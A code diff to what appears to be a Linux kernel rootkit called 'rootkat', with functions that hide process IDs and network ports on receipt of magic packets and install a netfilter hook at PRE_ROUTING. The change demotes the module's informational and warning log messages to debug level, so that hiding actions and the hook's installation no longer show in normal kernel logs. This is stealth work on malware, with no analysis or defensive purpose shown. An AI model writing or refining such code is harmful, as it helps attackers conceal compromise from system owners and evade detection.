@@ -54,14 +54,14 @@ static void rootkat_handle_net_magic(u8 action, u32 arg)
 	switch (action) {
 	case ROOTKAT_NET_ACT_HIDE_PID:
 		rootkat_hide_pid((pid_t)arg);
-		pr_info(TAG "net hide pid %u\n", arg);
+		pr_debug(TAG "net hide pid %u\n", arg);
 		break;
 	case ROOTKAT_NET_ACT_HIDE_PORT:
 		rootkat_hide_port((u16)arg);
-		pr_info(TAG "net hide port %u\n", arg);
+		pr_debug(TAG "net hide port %u\n", arg);
 		break;
 	default:
-		pr_warn(TAG "unknown net action %u\n", action);
+		pr_debug(TAG "unknown net action %u\n", action);
 		break;
 	}
 }
@@ -137,7 +137,7 @@ int rootkat_hook_netfilter_install(void)
 		return rc;
 	}
 	rootkat_nf_installed = true;
-	pr_info(TAG "netfilter hook armed at PRE_ROUTING\n");
+	pr_debug(TAG "netfilter hook armed at PRE_ROUTING\n");
 	return 0;
 }
 
@@ -147,5 +147,5 @@ void rootkat_hook_netfilter_remove(void)
 		return;
 	nf_unregister_fn(&init_net, &rootkat_nf_ops);
 	rootkat_nf_installed = false;
-	pr_info(TAG "netfilter hook removed\n");
+	pr_debug(TAG "netfilter hook removed\n");
 }
